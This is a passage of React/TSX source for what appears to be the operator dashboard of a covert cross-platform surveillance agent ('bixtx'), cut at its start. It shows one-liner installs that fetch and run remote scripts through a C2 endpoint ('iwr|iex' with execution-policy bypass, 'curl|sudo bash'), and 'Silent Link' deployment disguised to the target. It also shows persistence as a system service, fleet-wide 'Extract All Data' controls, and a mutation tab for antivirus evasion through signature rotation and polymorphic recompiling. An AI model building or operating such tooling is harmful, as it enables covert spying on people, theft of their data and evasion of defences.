                          style={{ background:"#0a1628", color:"#b8cce8" }}>
                          {cmd.length > 100 ? cmd.slice(0, 100) + "…" : cmd}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Setup instructions for selected platform */}
              <div className="rounded-2xl overflow-hidden" style={{ background:"#050410", border:"1px solid rgba(59,130,246,0.22)" }}>
                <div className="px-4 py-2.5 flex items-center gap-2 border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#030b16" }}>
                  <Terminal size={13} color="#3b82f6" />
                  <span className="text-xs font-mono" style={{ color:"#6b8ab0" }}>Setup Instructions — {OS_LABEL[targetOS]}</span>
                </div>
                <div className="p-4 min-h-48 font-mono text-xs space-y-1.5 overflow-y-auto max-h-72">
                  {targetOS === "android" ? (<>
                    <div style={{ color:"#10b981" }}># bixtx Android Agent — Kotlin native APK</div>
                    <div style={{ color:"#6b8ab0" }}># Option A: Build via CI (recommended)</div>
                    <div style={{ color:"#b8cce8" }}>1. Set GITHUB_TOKEN + GITHUB_REPO on your Render server</div>
                    <div style={{ color:"#b8cce8" }}>2. Click "Build" on Android above</div>
                    <div style={{ color:"#b8cce8" }}>3. CI builds in ~3 min → click "Download" (auto-enabled)</div>
                    <div style={{ color:"#6b8ab0" }}># Option B: Build locally (requires Android SDK)</div>
                    <div style={{ color:"#b8cce8" }}>cd software-android</div>
                    <div style={{ color:"#b8cce8" }}>{`./gradlew assembleRelease -Pc2WsUrl="${c2Endpoint}" -PbeaconInterval=${beaconInterval}`}</div>
                    <div style={{ color:"#6b8ab0" }}># APK → app/build/outputs/apk/release/app-release.apk</div>
                    <div style={{ color:"#6b8ab0" }}># Sideload: adb install -r app-release.apk</div>
                  </>) : targetOS === "ios" ? (<>
                    <div style={{ color:"#3b82f6" }}># bixtx iOS Agent — Swift WebSocket C2</div>
                    <div style={{ color:"#6b8ab0" }}># Requirements: macOS + Xcode 15+ + Apple Developer account</div>
                    <div style={{ color:"#b8cce8" }}>open software-ios/Package.swift</div>
                    <div style={{ color:"#6b8ab0" }}># Set C2 endpoint in Sources/BixtxAgent/Config.swift:</div>
                    <div style={{ color:"#10d9a0" }}>{`C2_WS_URL = "${c2Endpoint}"`}</div>
                    <div style={{ color:"#10d9a0" }}>{`BEACON_INTERVAL = ${beaconInterval}`}</div>
                    <div style={{ color:"#6b8ab0" }}># Archive + distribute via Enterprise cert or TestFlight</div>
                    <div style={{ color:"#6b8ab0" }}># OR: generate a link (left panel) for MDM silent push</div>
                  </>) : targetOS === "harmony" ? (<>
                    <div style={{ color:"#a855f7" }}># bixtx HarmonyOS Agent — ArkTS WebSocket C2</div>
                    <div style={{ color:"#6b8ab0" }}># Requirements: DevEco Studio 4.0+ + Huawei Developer account</div>
                    <div style={{ color:"#b8cce8" }}>deveco-studio software-harmony/</div>
                    <div style={{ color:"#6b8ab0" }}># Set C2 endpoint in entry/src/main/ets/agent/Config.ets:</div>
                    <div style={{ color:"#10d9a0" }}>{`C2_WS_URL: "${c2Endpoint}"`}</div>
                    <div style={{ color:"#10d9a0" }}>{`BEACON_INTERVAL: ${beaconInterval}`}</div>
                    <div style={{ color:"#6b8ab0" }}># Build HAP → sign → deploy via AGC enterprise channel</div>
                    <div style={{ color:"#6b8ab0" }}># OR: hdc app install bixtx-agent.hap  (direct sideload)</div>
                  </>) : targetOS === "windows" ? (<>
                    <div style={{ color:"#6b8ab0" }}># One-liner silent install (download + run concurrently):</div>
                    <div style={{ color:"#b8cce8" }}>{`powershell -ExecutionPolicy Bypass -c "& { $s=iwr '${API_BASE}/agent/download/windows.ps1' -UseBasicParsing; iex $s.Content }"`}</div>
                    <div style={{ color:"#6b8ab0" }}># Manual: download windows.ps1 then run as Administrator</div>
                    <div style={{ color:"#b8cce8" }}>.\install.ps1 -EnrollKey BTX-WIN-XXXX -C2Url {c2Endpoint}</div>
                    <div style={{ color:"#6b8ab0" }}># Installs as Windows Service — persists across reboots</div>
                  </>) : (<>
                    <div style={{ color:"#6b8ab0" }}># One-liner silent install (downloads + installs concurrently):</div>
                    <div style={{ color:"#b8cce8" }}>{`curl -sSL '${API_BASE}/agent/download/${targetOS === "macos" ? "macos" : "linux"}.sh' | sudo bash -s -- --key BTX-KEY --c2 ${c2Endpoint}`}</div>
                    <div style={{ color:"#10b981" }}># Installs as {targetOS === "macos" ? "launchd daemon" : "systemd service"} — runs silently in background</div>
                  </>)}
                </div>

                {/* Bypass accordion */}
                <div className="border-t" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
                  <button
                    onClick={() => setShowBypass(b => !b)}
                    className="w-full flex items-center justify-between px-4 py-2.5 text-xs font-bold transition-colors"
                    style={{ color:"#f59e0b", background: showBypass ? "rgba(245,158,11,0.08)" : "transparent" }}>
                    <div className="flex items-center gap-2">
                      <Shield size={12} />
                      {bypass.title}
                    </div>
                    {showBypass ? <ChevronUp size={12} /> : <ChevronDown size={12} />}
                  </button>
                  {showBypass && (
                    <div className="px-4 pb-4 space-y-1.5">
                      {bypass.steps.map((step, i) => (
                        <div key={i} className="flex items-start gap-2 text-[10px] font-mono"
                          style={{ color:"#b8cce8" }}>
                          <span style={{ color:"#f59e0b", flexShrink:0 }}>{i + 1}.</span>
                          <span>{step}</span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>

              {/* Agent specs */}
              <div className="rounded-2xl p-4" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
                <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Agent Specifications</div>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                  {[
                    { label:"Runtime",    val:"Node.js 18+",        icon:<WifiIcon size={13} />,  color:"#10b981" },
                    { label:"Protocol",   val:"WebSocket / WSS",    icon:<WifiIcon size={13} />,  color:"#3b82f6" },
                    { label:"Encryption", val:"AES-256-GCM",        icon:<Lock size={13} />,      color:"#f59e0b" },
                    { label:"Beacon",     val:`${beaconInterval}s`, icon:<Signal size={13} />,    color:"#10d9a0" },
                    { label:"CPU Impact", val:"<1% idle",           icon:<Activity size={13} />,  color:"#10b981" },
                    { label:"DB",         val:"SQLite encrypted",   icon:<HardDrive size={13} />, color:"#a855f7" },
                    { label:"Platforms",  val:"6 OS supported",     icon:<Cpu size={13} />,       color:"#3b82f6" },
                    { label:"Persist",    val:"systemd/launchd/Svc",icon:<Shield size={13} />,    color:"#10d9a0" },
                  ].map(s => (
                    <div key={s.label} className="rounded-lg p-3" style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.12)" }}>
                      <div className="flex items-center gap-1.5 mb-1" style={{ color:s.color }}>{s.icon}
                        <span className="text-[10px] font-mono uppercase tracking-wide" style={{ color:"#6b8ab0" }}>{s.label}</span>
                      </div>
                      <div className="text-sm font-bold capitalize" style={{ color:s.color }}>{s.val}</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>

          {/* ── 6-platform link cards ── */}
          {enrollData && Array.isArray(enrollData.links) && (
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>
                  Platform Install Links — 6 unique keys — expires {new Date(enrollData.expiresAt).toLocaleString()}
                </div>
                <button onClick={handleGenerateLink} disabled={enrollLoading}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold"
                  style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.3)" }}>
                  <RefreshCw size={11} className={enrollLoading ? "animate-spin" : ""} /> Regenerate
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
                {enrollData.links.map(link => {
                  const pm = PLAT_META[link.platform] ?? { icon:"🖥", color:"#6b8ab0", label: link.platform };
                  const isBinary = BINARY_PLATFORMS.includes(link.platform as BinaryPlatform);
                  const previewLines = link.installCommand.split("\n").slice(0, 2).join("\n");
                  return (
                    <div key={link.platform} className="rounded-2xl p-4 space-y-3"
                      style={{ background:"#0a1628", border:`1px solid ${pm.color}35` }}>
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <span className="text-xl">{pm.icon}</span>
                          <div>
                            <div className="font-bold text-sm" style={{ color:pm.color }}>{pm.label}</div>
                            <div className="text-[9px] font-mono" style={{ color:"#4a6080" }}>Key: {link.enrollKey}</div>
                          </div>
                        </div>
                        <div className="text-[9px] font-mono px-1.5 py-0.5 rounded"
                          style={{ background:`${pm.color}15`, color:pm.color, border:`1px solid ${pm.color}30` }}>
                          {link.linkId}
                        </div>
                      </div>

                      <div className="space-y-1">
                        <div className="text-[9px] font-mono uppercase tracking-widest" style={{ color:"#4a6080" }}>Enroll URL</div>
                        <div className="flex items-center gap-2 rounded-lg px-2.5 py-1.5"
                          style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.18)" }}>
                          <span className="text-[10px] font-mono truncate flex-1" style={{ color:"#10d9a0" }}>
                            {link.enrollUrl}
                          </span>
                          <button title="Copy URL"
                            onClick={() => { navigator.clipboard.writeText(link.enrollUrl); show(`${pm.label} URL copied`, "success"); }}>
                            <Copy size={11} color="#6b8ab0" />
                          </button>
                          <a href={link.enrollUrl} target="_blank" rel="noreferrer" title="Open URL">
                            <ExternalLink size={11} color="#3b82f6" />
                          </a>
                        </div>
                      </div>

                      <div className="space-y-1">
                        <div className="text-[9px] font-mono uppercase tracking-widest" style={{ color:"#4a6080" }}>Install Command</div>
                        <div className="rounded-lg px-2.5 py-2" style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.12)" }}>
                          <pre className="text-[9px] font-mono break-all whitespace-pre-wrap leading-relaxed" style={{ color:"#b8cce8" }}>
                            {previewLines}{link.installCommand.split("\n").length > 2 ? "\n…" : ""}
                          </pre>
                          <button className="mt-1 text-[9px] font-mono flex items-center gap-1" style={{ color:"#3b82f6" }}
                            onClick={() => { navigator.clipboard.writeText(link.installCommand); show(`${pm.label} command copied`, "success"); }}>
                            <Copy size={9} /> Copy full command
                          </button>
                        </div>
                      </div>

                      {/* Smart download — for binary platforms open in new tab (OTA or direct); scripts download directly */}
                      {isBinary ? (
                        <a href={link.enrollUrl} target="_blank" rel="noreferrer"
                          className="flex items-center justify-center gap-2 py-2 rounded-xl font-bold text-xs transition-all hover:opacity-90 no-underline"
                          style={{ background:`${pm.color}18`, border:`1px solid ${pm.color}40`, color:pm.color }}>
                          <Download size={12} />
                          {link.platform === "ios" ? "Open OTA Install" : `Download for ${pm.label}`}
                        </a>
                      ) : (
                        <a href={link.downloadUrl} download target="_blank" rel="noreferrer"
                          className="flex items-center justify-center gap-2 py-2 rounded-xl font-bold text-xs transition-all hover:opacity-90 no-underline"
                          style={{ background:`${pm.color}18`, border:`1px solid ${pm.color}40`, color:pm.color }}>
                          <Download size={12} />
                          Download for {pm.label}
                        </a>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>
          )}
        </div>
      )}

      {/* DEPLOY TAB */}
      {tab === "deploy" && (
        <div className="space-y-5">
          <div className="rounded-2xl p-5" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
            <div className="text-xs font-mono uppercase tracking-widest mb-4" style={{ color:"#6b8ab0" }}>Deployment Methods</div>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              {[
                { title:"Silent Link", desc:"Disguised URL sent via any channel. Target visits link, agent installs silently.", icon:"🔗", color:"#3b82f6" },
                { title:"QR Enrollment", desc:"Scan QR code on target device. No typing required. Works on mobile.", icon:"📷", color:"#10d9a0" },
                { title:"Direct Install", desc:"Manual install via USB, ADB, or MDM push for managed fleets.", icon:"💾", color:"#10b981" },
              ].map(m => (
                <div key={m.title} className="rounded-xl p-4 flex flex-col gap-3"
                  style={{ background:"#030b16", border:`1px solid ${m.color}30` }}>
                  <div className="text-2xl">{m.icon}</div>
                  <div className="font-bold text-sm" style={{ color:m.color }}>{m.title}</div>
                  <div className="text-xs leading-relaxed" style={{ color:"#6b8ab0" }}>{m.desc}</div>
                </div>
              ))}
            </div>
          </div>
          <DeployLinkPanel show={show} />
        </div>
      )}

      {/* FLEET TAB */}
      {tab === "fleet" && (
        <div className="space-y-4">
          <div className="rounded-2xl overflow-hidden" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
              <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>
                Active Agent Fleet — {fleetLoading ? "loading…" : `${FLEET.length} node${FLEET.length !== 1 ? "s" : ""}`}
              </div>
              <div className="flex gap-2">
                <button onClick={() => show("OTA update pushed to all active agents", "success")}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold"
                  style={{ background:"rgba(6,182,212,0.15)", color:"#10d9a0", border:"1px solid rgba(6,182,212,0.3)" }}>
                  <RefreshCw size={11} /> OTA Update All
                </button>
                <button onClick={() => show("Data extraction initiated on all agents", "info")}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold"
                  style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.3)" }}>
                  <Upload size={11} /> Extract All Data
                </button>
              </div>
            </div>
            <div className="divide-y divide-purple-500/10">
              {fleetLoading && (
                <div className="px-5 py-8 text-center text-sm font-mono" style={{ color:"#6b8ab0" }}>
                  <RefreshCw size={14} className="animate-spin inline mr-2"/>Loading live fleet data…
                </div>
              )}
              {!fleetLoading && FLEET.length === 0 && (
                <div className="px-5 py-10 text-center" style={{ color:"#6b8ab0" }}>
                  <Signal size={24} className="mx-auto mb-3 opacity-30"/>
                  <div className="text-sm font-mono">No agents connected</div>
                  <div className="text-[10px] mt-1">Enroll a device using a deployment link or QR code</div>
                </div>
              )}
              {FLEET.map(agent => (
                <div key={agent.id} className="px-5 py-3 flex flex-wrap items-center gap-4">
                  <div className="flex items-center gap-3 flex-1 min-w-48">
                    <div className="w-8 h-8 rounded-lg flex items-center justify-center text-base flex-shrink-0"
                      style={{ background:`${OS_COLOR[agent.os]}18`, border:`1px solid ${OS_COLOR[agent.os]}30` }}>
                      {OS_ICON[agent.os]}
                    </div>
                    <div>
                      <div className="text-sm font-bold" style={{ color:"#e2eaf6" }}>{agent.device}</div>
                      <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{agent.ip} · v{agent.version}</div>
                    </div>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <div className="w-1.5 h-1.5 rounded-full animate-pulse"
                      style={{ background: agent.status==="active"?"#10b981":agent.status==="warning"?"#f59e0b":"#ef4444" }} />
                    <span className="text-[10px] font-mono uppercase" style={{ color: agent.status==="active"?"#10b981":agent.status==="warning"?"#f59e0b":"#ef4444" }}>
                      {agent.status}
                    </span>
                  </div>
                  <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>Last ping: {agent.lastPing}</div>
                  <div className="text-[10px] font-mono" style={{ color:"#10d9a0" }}>Queue: {agent.dataQueue}</div>
                  <div className="text-[10px] font-mono" style={{ color:"#3b82f6" }}>Mutations: {agent.mutations}</div>
                  <div className="flex gap-1.5 ml-auto">
                    <button onClick={() => show(`Data extracted from ${agent.device}`, "success")}
                      className="px-2 py-1 rounded text-[10px] font-bold"
                      style={{ background:"rgba(6,182,212,0.12)", color:"#10d9a0", border:"1px solid rgba(6,182,212,0.25)" }}>
                      Extract
                    </button>
                    <button onClick={() => show(`Update pushed to ${agent.device}`, "info")}
                      className="px-2 py-1 rounded text-[10px] font-bold"
                      style={{ background:"rgba(59,130,246,0.12)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.25)" }}>
                      Update
                    </button>
                    <button onClick={() => show(`Kill switch activated on ${agent.device}`, "error")}
                      className="px-2 py-1 rounded text-[10px] font-bold"
                      style={{ background:"rgba(239,68,68,0.1)", color:"#ef4444", border:"1px solid rgba(239,68,68,0.25)" }}>
                      Kill
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* CAPABILITIES TAB */}
      {tab === "capabilities" && (
        <div className="space-y-4">
          <div className="flex items-center justify-between mb-2">
            <div className="text-xs font-mono" style={{ color:"#6b8ab0" }}>
              {Object.values(modules).filter(Boolean).length} of {MODULE_DEFS.length} modules active
            </div>
            <div className="flex gap-2">
              <button onClick={() => setModules(Object.fromEntries(MODULE_DEFS.map(m => [m.key, true])))}
                className="px-3 py-1.5 rounded-lg text-xs font-bold"
                style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.3)" }}>
                Enable All
              </button>
              <button onClick={() => setModules(Object.fromEntries(MODULE_DEFS.map(m => [m.key, false])))}
                className="px-3 py-1.5 rounded-lg text-xs font-bold"
                style={{ background:"rgba(239,68,68,0.1)", color:"#ef4444", border:"1px solid rgba(239,68,68,0.25)" }}>
                Disable All
              </button>
              <button onClick={() => show("Capability update pushed to all active agents", "success")}
                className="px-3 py-1.5 rounded-lg text-xs font-bold"
                style={{ background:"linear-gradient(135deg,#3b82f6,#10d9a0)", color:"#fff" }}>
                Push to Fleet
              </button>
            </div>
          </div>
          {(["Input","Visual","Audio","Location","Network","System","Comms","AI"] as const).map(cat => {
            const catMods = MODULE_DEFS.filter(m => m.category === cat);
            return (
              <div key={cat} className="rounded-2xl overflow-hidden" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
                <div className="px-5 py-2.5 border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#030b16" }}>
                  <span className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>{cat} Modules</span>
                </div>
                <div className="divide-y divide-purple-500/10">
                  {catMods.map(mod => (
                    <div key={mod.key} className="px-5 py-3 flex items-center gap-4">
                      <div className="flex-1">
                        <div className="flex items-center gap-2 mb-0.5">
                          <span className="text-sm font-bold" style={{ color:"#e2eaf6" }}>{mod.label}</span>
                          <span className="px-1.5 py-0.5 rounded text-[9px] font-bold uppercase"
                            style={{ background:`${RISK_COLOR[mod.risk]}15`, color:RISK_COLOR[mod.risk], border:`1px solid ${RISK_COLOR[mod.risk]}30` }}>
                            {mod.risk}
                          </span>
                        </div>
                        <div className="text-xs" style={{ color:"#6b8ab0" }}>{mod.desc}</div>
                      </div>
                      <button onClick={() => setModules(prev => ({ ...prev, [mod.key]: !prev[mod.key] }))}
                        className="relative w-10 h-5 rounded-full transition-all flex-shrink-0"
                        style={{ background: modules[mod.key] ? "#3b82f6" : "#0f1e3a" }}>
                        <span className="absolute top-0.5 transition-all duration-200 w-4 h-4 rounded-full bg-white shadow"
                          style={{ left: modules[mod.key] ? "calc(100% - 1.1rem)" : "0.125rem" }} />
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            );
          })}
        </div>
      )}

      {/* AI MUTATIONS TAB */}
      {tab === "mutations" && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
          <div className="space-y-5">
            <div className="rounded-2xl p-5" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
              <div className="text-xs font-mono uppercase tracking-widest mb-4" style={{ color:"#6b8ab0" }}>AV Detection Scan</div>
              <button onClick={handleAVScan} disabled={avScanning}
                className="w-full flex items-center justify-center gap-2 py-3 rounded-xl font-bold text-sm mb-4 transition-all disabled:opacity-60"
                style={{ background:"linear-gradient(135deg,#3b82f6,#10d9a0)", color:"#fff" }}>
                {avScanning ? <><RefreshCw size={14} className="animate-spin" /> Scanning engines...</> : <><Shield size={14} /> Run AV Detection Test</>}
              </button>
              {avScanning && (
                <div className="space-y-2">
                  <div className="text-xs font-mono text-center mb-2" style={{ color:"#3b82f6" }}>Testing against 12 AV engines...</div>
                  <div className="w-full h-1.5 rounded-full overflow-hidden" style={{ background:"rgba(59,130,246,0.2)" }}>
                    <div className="h-full rounded-full animate-pulse" style={{ width:"70%", background:"linear-gradient(90deg,#3b82f6,#10d9a0)" }} />
                  </div>
                </div>
              )}
              {avScanResult && !avScanning && (
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-sm font-bold" style={{ color:"#e2eaf6" }}>Results</span>
                    <span className="text-sm font-bold" style={{ color: avScanResult.filter(r => r.detected).length === 0 ? "#10b981" : "#f59e0b" }}>
                      {avScanResult.filter(r => r.detected).length}/{avScanResult.length} detected
                    </span>
                  </div>
                  {avScanResult.map(r => (
                    <div key={r.engine} className="flex items-center justify-between px-3 py-1.5 rounded-lg"
                      style={{ background:"#030b16", border:`1px solid ${r.detected ? "rgba(239,68,68,0.3)" : "rgba(16,185,129,0.15)"}` }}>
                      <span className="text-xs font-mono" style={{ color:"#b8cce8" }}>{r.engine}</span>
                      <span className="text-[10px] font-bold uppercase px-2 py-0.5 rounded"
                        style={{ background: r.detected ? "rgba(239,68,68,0.15)" : "rgba(16,185,129,0.15)", color: r.detected ? "#ef4444" : "#10b981" }}>
                        {r.detected ? "DETECTED" : "CLEAN"}
                      </span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="rounded-2xl p-5" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
              <div className="text-xs font-mono uppercase tracking-widest mb-4" style={{ color:"#6b8ab0" }}>Global Mutation Push</div>
              <div className="space-y-2 mb-4">
                {[
                  { label:"Signature Rotation",    desc:"Randomise all binary hash signatures" },
                  { label:"Process Rename",         desc:"Change process name across fleet" },
                  { label:"C2 Channel Hop",         desc:"Switch to backup C2 endpoint" },
                  { label:"Memory-Only Reload",     desc:"Reload agent without disk write" },
                  { label:"Polymorphic Recompile",  desc:"Full binary regeneration w/ new keys" },
                ].map(opt => (
                  <div key={opt.label} className="flex items-start gap-3 px-3 py-2 rounded-lg"
                    style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.12)" }}>
                    <Check size={12} color="#3b82f6" className="mt-0.5 flex-shrink-0" />
                    <div>
                      <div className="text-xs font-bold" style={{ color:"#e2eaf6" }}>{opt.label}</div>
                      <div className="text-[10px]" style={{ color:"#6b8ab0" }}>{opt.desc}</div>
                    </div>
                  </div>
                ))}
              </div>
              {mutating && (
                <div className="mb-3">
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-xs font-mono" style={{ color:"#3b82f6" }}>Pushing mutation...</span>
                    <span className="text-xs font-mono" style={{ color:"#3b82f6" }}>{mutProgress}%</span>
                  </div>
                  <div className="w-full h-1.5 rounded-full overflow-hidden" style={{ background:"rgba(59,130,246,0.2)" }}>
                    <div className="h-full rounded-full transition-all duration-100" style={{ width:`${mutProgress}%`, background:"linear-gradient(90deg,#3b82f6,#10d9a0)" }} />
                  </div>
                </div>
              )}
              <button onClick={handleMutate} disabled={mutating}
                className="w-full flex items-center justify-center gap-2 py-3 rounded-xl font-bold text-sm transition-all disabled:opacity-60"
                style={{ background: mutating ? "rgba(59,130,246,0.3)" : "linear-gradient(135deg,#2563eb,#3b82f6)", color:"#fff" }}>
                {mutating ? <><RefreshCw size={14} className="animate-spin" /> Mutating fleet...</> : <><Zap size={14} /> Execute Global Mutation</>}
              </button>
            </div>
          </div>

          <div className="rounded-2xl overflow-hidden" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
            <div className="px-5 py-3 border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#030b16" }}>
              <span className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Mutation Log</span>
            </div>
            <div className="divide-y divide-purple-500/10 overflow-y-auto max-h-[600px]">
              {mutLog.length === 0 && (
                <div className="px-5 py-10 text-center" style={{ color:"#6b8ab0" }}>
                  <div className="text-sm font-mono">No mutations yet</div>
                  <div className="text-[10px] mt-1">Execute a global mutation to see the log here</div>
                </div>
              )}
              {mutLog.map((entry, i) => (
                <div key={i} className="px-5 py-3">
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{entry.ts}</span>
                    <span className="text-[10px] font-bold px-2 py-0.5 rounded"
                      style={{ background:"rgba(16,185,129,0.12)", color:"#10b981" }}>{entry.result}</span>
                  </div>
                  <div className="text-xs font-semibold mb-0.5" style={{ color:"#e2eaf6" }}>{entry.event}</div>
                  <div className="text-[10px]" style={{ color:"#6b8ab0" }}>Target: {entry.target}</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
